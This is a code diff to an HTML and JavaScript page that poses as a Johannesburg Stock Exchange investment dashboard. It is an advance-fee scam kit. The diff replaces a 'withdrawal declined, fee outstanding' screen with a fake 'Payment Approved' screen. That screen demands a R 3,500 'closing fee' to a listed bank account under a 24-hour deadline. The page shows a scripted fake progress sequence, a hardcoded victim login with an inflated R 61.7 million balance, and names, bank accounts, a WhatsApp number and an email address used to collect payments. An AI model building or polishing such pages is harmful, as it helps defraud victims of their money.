@@ -64,31 +64,45 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
 .wbtn{width:100%;padding:13px;background:#1a1a2e;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;margin-top:4px;}
 .wbtn:hover{background:#0d3b70;}
 .werr{background:#fff0f0;border:1px solid #ffa0a0;color:#c0392b;padding:10px 14px;border-radius:6px;font-size:13px;margin-top:10px;display:none;}
-.proc{text-align:center;padding:20px 0;}
-.proc-icon{font-size:46px;color:#1a1a2e;margin-bottom:14px;}
-.proc-txt{font-weight:700;font-size:16px;color:#1a1a2e;margin-bottom:18px;}
-.prog-wrap{background:#e5e7eb;border-radius:50px;height:8px;overflow:hidden;margin-bottom:12px;}
-.prog-bar{height:100%;width:0;background:linear-gradient(90deg,#1a1a2e,#0d3b70);border-radius:50px;transition:width 0.5s;}
-.proc-sub{font-size:13px;color:#888;}
-.decl{text-align:center;padding:8px 0;}
-.decl-icon{font-size:54px;color:#dc2626;margin-bottom:10px;}
-.decl h4{font-size:18px;color:#dc2626;margin-bottom:8px;}
-.decl > p{font-size:13px;color:#555;margin-bottom:12px;}
-.decl-reason{background:#fffbeb;border:1px solid #f59e0b;border-radius:8px;padding:14px;font-size:13px;color:#78350f;text-align:left;margin-bottom:12px;line-height:1.8;}
-.decl-reason i{color:#f59e0b;margin-right:6px;}
-.bank-box{background:#f0f4ff;border:1px solid #93c5fd;border-radius:8px;padding:16px;text-align:left;font-size:13px;margin-bottom:12px;}
+.proc{text-align:center;padding:16px 0;}
+.proc-icon{font-size:46px;color:#1a1a2e;margin-bottom:12px;}
+.proc-txt{font-weight:700;font-size:15px;color:#1a1a2e;margin-bottom:14px;}
+.prog-wrap{background:#e5e7eb;border-radius:50px;height:8px;overflow:hidden;margin-bottom:8px;}
+.prog-bar{height:100%;width:0;background:linear-gradient(90deg,#1a1a2e,#0d3b70);border-radius:50px;transition:width 0.6s ease;}
+.proc-pct{font-size:12px;color:#888;margin-bottom:12px;font-weight:700;}
+.proc-steps{text-align:left;margin-top:8px;max-height:160px;overflow:hidden;}
+.proc-step{display:flex;align-items:center;gap:8px;font-size:12px;color:#aaa;padding:3px 0;transition:color 0.3s;}
+.proc-step.done{color:#16a34a;}
+.proc-step.active{color:#1a1a2e;font-weight:700;}
+.proc-step i{width:14px;text-align:center;font-size:11px;}
+.appr{text-align:center;padding:4px 0;}
+.appr-icon{font-size:56px;color:#16a34a;margin-bottom:10px;animation:popIn 0.5s ease;}
+@keyframes popIn{0%{transform:scale(0);}70%{transform:scale(1.15);}100%{transform:scale(1);}}
+.appr h4{font-size:20px;color:#16a34a;margin-bottom:6px;font-weight:800;}
+.appr-sub{font-size:13px;color:#555;margin-bottom:14px;}
+.appr-amount{background:linear-gradient(135deg,#f0fdf4,#dcfce7);border:2px solid #16a34a;border-radius:10px;padding:14px;margin-bottom:12px;}
+.appr-amount .lbl{font-size:11px;color:#16a34a;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-bottom:4px;}
+.appr-amount .val{font-size:1.7rem;font-weight:800;color:#1a1a2e;}
+.appr-ref{background:#f8fafc;border-radius:6px;padding:8px 12px;font-size:12px;color:#555;margin-bottom:14px;border-left:3px solid #16a34a;text-align:left;}
+.closing-box{background:#fffbeb;border:2px solid #f59e0b;border-radius:10px;padding:16px;margin-bottom:12px;text-align:left;}
+.closing-box .ctitle{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:800;color:#92400e;margin-bottom:8px;}
+.closing-box .ctitle i{color:#f59e0b;font-size:17px;}
+.closing-box .cdesc{font-size:12px;color:#78350f;margin-bottom:12px;line-height:1.7;}
+.closing-fee-amt{background:#fff;border:1px solid #fcd34d;border-radius:7px;padding:10px 13px;display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;}
+.closing-fee-amt .lbl{font-size:12px;color:#888;}
+.closing-fee-amt .val{font-size:1.15rem;font-weight:800;color:#dc2626;}
+.bank-box{background:#f0f4ff;border:1px solid #93c5fd;border-radius:8px;padding:14px;text-align:left;font-size:13px;margin-bottom:10px;}
 .bank-box h5{font-size:13px;font-weight:700;color:#1a1a2e;margin-bottom:10px;display:flex;align-items:center;gap:6px;}
 .bank-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid #dbeafe;}
 .bank-row:last-child{border-bottom:none;}
 .bank-row .lbl{color:#666;font-size:12px;}
 .bank-row .val{font-weight:700;color:#1a1a2e;font-size:13px;}
-.ref-box{background:#fef3c7;border:1px solid #fcd34d;border-radius:8px;padding:12px 16px;text-align:left;font-size:13px;margin-bottom:12px;display:flex;align-items:center;gap:10px;}
-.ref-box i{color:#f59e0b;font-size:18px;}
-.ref-box .ref-lbl{color:#666;font-size:12px;display:block;}
+.ref-box{background:#fef3c7;border:1px solid #fcd34d;border-radius:8px;padding:10px 14px;text-align:left;font-size:13px;margin-bottom:10px;display:flex;align-items:center;gap:10px;}
+.ref-box i{color:#f59e0b;font-size:17px;}
+.ref-box .ref-lbl{color:#666;font-size:11px;display:block;}
 .ref-box .ref-val{font-weight:800;color:#92400e;font-size:15px;letter-spacing:1px;}
-.abox{display:flex;align-items:flex-start;gap:12px;background:#f0fdf4;border:1px solid #86efac;border-radius:8px;padding:14px;text-align:left;font-size:13px;margin-bottom:16px;}
-.abox .fab{font-size:28px;color:#25d366;margin-top:2px;}
-.abox a{color:#1d4ed8;text-decoration:none;}
+.urgency-note{background:#fef2f2;border:1px solid #fecaca;border-radius:7px;padding:10px 13px;font-size:12px;color:#dc2626;margin-bottom:12px;display:flex;align-items:flex-start;gap:8px;line-height:1.6;text-align:left;}
+.urgency-note i{margin-top:2px;flex-shrink:0;}
 .btn-retry{background:#f5f5f5;border:1px solid #ddd;padding:10px 22px;border-radius:7px;font-size:13px;cursor:pointer;font-family:inherit;}
 .btn-retry:hover{background:#1a1a2e;color:#fff;}
 .dfooter{text-align:center;padding:18px;font-size:12px;color:#aaa;border-top:1px solid #e5e7eb;}
@@ -159,6 +173,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
         <span class="dbadge g"><i class="fa fa-shield-alt"></i> Verified</span>
       </div>
     </div>
+
     <div class="dlower">
       <div class="dpanel">
         <div class="dpanel-title"><i class="fa fa-chart-pie"></i> Investment Holdings</div>
@@ -167,8 +182,11 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
           <tbody id="hTbody"></tbody>
         </table>
       </div>
+
       <div class="dpanel">
         <div class="dpanel-title"><i class="fa fa-money-bill-wave"></i> Withdraw Funds</div>
+
+        <!-- STEP 1: Form -->
         <div id="wStep1">
           <div class="wnote"><i class="fa fa-check-circle" style="color:#16a34a;"></i> No minimum withdrawal &mdash; withdraw any amount.</div>
           <div class="wfield">
@@ -181,76 +199,69 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
             <input type="number" id="wAmt" placeholder="Enter any amount">
           </div>
           <div class="wfield">
-            <label>Crypto Wallet Address</label>
-            <input type="text" id="wWallet" placeholder="Enter your crypto wallet address" maxlength="500" autocomplete="off" spellcheck="false">
-            <small>Supports Bitcoin, Ethereum, USDT and all major wallet formats.</small>
+            <label>Bank Account Number</label>
+            <input type="text" id="wWallet" placeholder="Enter your bank account number" maxlength="500" autocomplete="off" spellcheck="false">
+            <small>Enter your full bank account number.</small>
           </div>
           <button class="wbtn" onclick="startWithdraw()"><i class="fa fa-paper-plane"></i> Submit Withdrawal Request</button>
           <div class="werr" id="werr"></div>
         </div>
 
+        <!-- STEP 2: Processing -->
         <div id="wProc" style="display:none;" class="proc">
           <div class="proc-icon"><i class="fa fa-spinner fa-spin"></i></div>
-          <div class="proc-txt">Processing your withdrawal...</div>
+          <div class="proc-txt">Processing Your Withdrawal...</div>
           <div class="prog-wrap"><div class="prog-bar" id="progBar"></div></div>
-          <div class="proc-sub" id="procStat">Connecting to secure gateway...</div>
+          <div class="proc-pct" id="procPct">0%</div>
+          <div class="proc-steps" id="procStepList"></div>
         </div>
 
-        <div id="wDecl" style="display:none;" class="decl">
-          <div class="decl-icon"><i class="fa fa-times-circle"></i></div>
-          <h4>Withdrawal Declined</h4>
-          <p>Your withdrawal request could not be processed.</p>
-
-          <div class="decl-reason">
-            <i class="fa fa-exclamation-triangle"></i>
-            <strong>Outstanding Fee Detected</strong><br>
-            There is an outstanding account fee of <strong>R 1,800.00</strong> that must be paid before any withdrawal can be processed.
+        <!-- STEP 3: Approved + Closing Fee -->
+        <div id="wAppr" style="display:none;" class="appr">
+          <div class="appr-icon"><i class="fa fa-check-circle"></i></div>
+          <h4>Payment Approved!</h4>
+          <p class="appr-sub">Your withdrawal has been verified and approved by JSE Risk &amp; Compliance.</p>
+          <div class="appr-amount">
+            <div class="lbl">Approved Withdrawal Amount</div>
+            <div class="val" id="apprAmt">R 0.00</div>
           </div>
-
-          <div class="bank-box">
-            <h5><i class="fa fa-university"></i> Pay Your Fee &mdash; Banking Details</h5>
-            <div class="bank-row">
-              <span class="lbl">Bank</span>
-              <span class="val">ABSA</span>
-            </div>
-            <div class="bank-row">
-              <span class="lbl">Account Number</span>
-              <span class="val">4113514633</span>
-            </div>
-            <div class="bank-row">
-              <span class="lbl">Account Type</span>
-              <span class="val">Current</span>
-            </div>
-            <div class="bank-row">
-              <span class="lbl">Branch Code</span>
-              <span class="val">632005</span>
-            </div>
-            <div class="bank-row">
-              <span class="lbl">Amount</span>
-              <span class="val" style="color:#dc2626;">R 1,800.00</span>
-            </div>
+          <div class="appr-ref">
+            <i class="fa fa-check-circle" style="color:#16a34a;margin-right:6px;"></i>
+            <strong>Transaction Ref:</strong> JSE-<span id="apprRef">000000</span> &nbsp;&bull;&nbsp; Status: <strong style="color:#16a34a;">APPROVED</strong>
           </div>
-
-          <div class="ref-box">
-            <i class="fa fa-tag"></i>
-            <div>
-              <span class="ref-lbl">Use this payment reference</span>
-              <span class="ref-val">Heini14</span>
+          <div class="closing-box">
+            <div class="ctitle"><i class="fa fa-lock-open"></i> Final Step &mdash; Closing Fee Required</div>
+            <div class="cdesc">
+              Your funds are ready to be released. To complete the transfer and credit your full profits directly to your wallet, a once-off <strong>Closing Fee of R 3,500.00</strong> is required. This covers final regulatory clearance and bank transfer processing.<br><br>
+              <strong>Once this fee is received, your full profit will be transferred to your wallet immediately.</strong>
             </div>
-          </div>
-
-          <div class="abox">
-            <i class="fab fa-whatsapp"></i>
-            <div>
-              <strong>Contact Your Agent After Payment</strong><br>
-              <span style="font-size:12px;color:#555;">Send proof of payment to your agent to unlock your withdrawal.</span><br><br>
-              <strong>WhatsApp:</strong> <a href="https://wa.me/27836240290" target="_blank">+27 83 624 0290</a><br>
-              <strong>Email:</strong> jsecompany72&#64;gmail.com
+            <div class="closing-fee-amt">
+              <span class="lbl">Closing Fee Due</span>
+              <span class="val">R 3,500.00</span>
+            </div>
+            <div class="bank-box">
+              <h5><i class="fa fa-university"></i> Pay Closing Fee &mdash; Banking Details</h5>
+              <div class="bank-row"><span class="lbl">Bank</span><span class="val">Standard Bank</span></div>
+              <div class="bank-row"><span class="lbl">Account Number</span><span class="val">10178723124</span></div>
+              <div class="bank-row"><span class="lbl">Account Holder</span><span class="val">Std Payment</span></div><div class="bank-row"><span class="lbl">Account Type</span><span class="val">Current</span></div>
+              <div class="bank-row"><span class="lbl">Branch Code</span><span class="val">051001</span></div>
+              <div class="bank-row"><span class="lbl">Amount</span><span class="val" style="color:#dc2626;">R 3,500.00</span></div>
+            </div>
+            <div class="ref-box">
+              <i class="fa fa-tag"></i>
+              <div>
+                <span class="ref-lbl">Use this payment reference</span>
+                <span class="ref-val">Payment02</span>
+              </div>
+            </div>
+            <div class="urgency-note">
+              <i class="fa fa-clock"></i>
+              <span>This approval expires in <strong>24 hours</strong>. Pay the closing fee promptly to ensure your funds are released without delay. Your profits will reflect in your wallet <strong>immediately</strong> after payment is confirmed.</span>
             </div>
           </div>
-
-          <button class="btn-retry" onclick="resetW()"><i class="fa fa-redo"></i> Try Again</button>
+          <button class="btn-retry" onclick="resetW()"><i class="fa fa-redo"></i> Start New Withdrawal</button>
         </div>
+
       </div>
     </div>
 
@@ -267,12 +278,12 @@ body{font-family:'Segoe UI',Arial,sans-serif;line-height:1.6;color:#333;}
 
 <script>
 var U = {
-  "Heini Van Niekerk": {
+  "Maree2026": {
     pw: "jse1836",
-    name: "Heini Van Niekerk",
-    portfolio: 12502900.90,
-    available: 10350100.50,
-    profit: 10233105.00,
+    name: "Mr A J Maree",
+    portfolio: 61700999.97,
+    available: 61700999.97,
+    profit: 61700999.97,
     h: [
       {f:"JSE Top 40 ETF", u:450, p:412.50, v:185625, r:"+18.2%"},
       {f:"Satrix MSCI World", u:320, p:298.75, v:95600, r:"+22.4%"},
@@ -397,35 +408,73 @@ function startWithdraw() {
   if (!code || code.length < 4) { errEl.textContent = "Please enter a valid withdrawal code."; errEl.style.display = "block"; return; }
   if (!wallet || wallet.length < 6) { errEl.textContent = "Please enter a valid crypto wallet address."; errEl.style.display = "block"; return; }
   if (isNaN(amt) || amt <= 0) { errEl.textContent = "Please enter a valid amount."; errEl.style.display = "block"; return; }
+
   document.getElementById("wStep1").style.display = "none";
   document.getElementById("wProc").style.display = "block";
-  var steps = ["Connecting to secure gateway...","Verifying account credentials...","Checking compliance status...","Contacting payment network...","Finalising request..."];
+
+  var steps = [
+    "Initialising secure connection...",
+    "Verifying withdrawal code...",
+    "Authenticating account credentials...",
+    "Checking KYC & compliance status...",
+    "Contacting JSE payment network...",
+    "Verifying wallet address...",
+    "Submitting to Risk & Compliance...",
+    "Awaiting final approval confirmation..."
+  ];
+
   var bar = document.getElementById("progBar");
-  var stat = document.getElementById("procStat");
+  var pct = document.getElementById("procPct");
+  var stepList = document.getElementById("procStepList");
+  var done = [];
   var s = 0;
+  var total = steps.length;
+
+  function render() {
+    var html = "";
+    for (var i = 0; i < done.length; i++) {
+      html += "<div class='proc-step done'><i class='fa fa-check-circle'></i> " + done[i] + "</div>";
+    }
+    if (s < total) {
+      html += "<div class='proc-step active'><i class='fa fa-circle-notch fa-spin'></i> " + steps[s] + "</div>";
+    }
+    stepList.innerHTML = html;
+  }
+
+  render();
+
   var iv = setInterval(function() {
+    done.push(steps[s]);
     s++;
-    bar.style.width = (s * 20) + "%";
-    if (steps[s]) stat.textContent = steps[s];
-    if (s >= 5) {
+    var p = Math.round((s / total) * 100);
+    bar.style.width = p + "%";
+    pct.textContent = p + "%";
+    if (s < total) {
+      render();
+    } else {
       clearInterval(iv);
+      render();
       setTimeout(function() {
         document.getElementById("wProc").style.display = "none";
-        document.getElementById("wDecl").style.display = "block";
-      }, 600);
+        var ref = "TXN" + Math.floor(Math.random() * 900000 + 100000);
+        document.getElementById("apprAmt").textContent = fmt(amt);
+        document.getElementById("apprRef").textContent = ref;
+        document.getElementById("wAppr").style.display = "block";
+      }, 1000);
     }
-  }, 900);
+  }, 750);
 }
 
 function resetW() {
   var s1 = document.getElementById("wStep1"); if (s1) s1.style.display = "block";
   var sp = document.getElementById("wProc"); if (sp) sp.style.display = "none";
-  var sd = document.getElementById("wDecl"); if (sd) sd.style.display = "none";
+  var sa = document.getElementById("wAppr"); if (sa) sa.style.display = "none";
   var wc = document.getElementById("wCode"); if (wc) wc.value = "";
   var wa = document.getElementById("wAmt"); if (wa) wa.value = "";
   var ww = document.getElementById("wWallet"); if (ww) ww.value = "";
   var pb = document.getElementById("progBar"); if (pb) pb.style.width = "0";
-  var ps = document.getElementById("procStat"); if (ps) ps.textContent = "Connecting to secure gateway...";
+  var pp = document.getElementById("procPct"); if (pp) pp.textContent = "0%";
+  var sl = document.getElementById("procStepList"); if (sl) sl.innerHTML = "";
   var we = document.getElementById("werr"); if (we) we.style.display = "none";
 }
 
